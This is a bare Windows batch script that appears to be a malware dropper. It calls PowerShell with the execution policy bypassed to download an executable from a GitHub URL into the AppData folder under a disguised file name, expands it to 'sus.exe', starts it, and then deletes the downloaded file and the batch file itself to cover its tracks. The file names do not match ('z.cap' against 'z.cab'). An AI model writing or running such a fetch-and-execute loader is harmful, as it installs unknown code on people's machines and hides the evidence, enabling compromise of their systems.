call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.WebClient).DownloadFile('https://github.com/oxsve/f/blob/master/ghlq.exe','%AppData%\z.cap')
call expand %AppData%\z.cab %AppData%\sus.exe
call start %AppData%\sus.exe
call del %AppData%\z.cab
call del %AppData%\prtol.bat
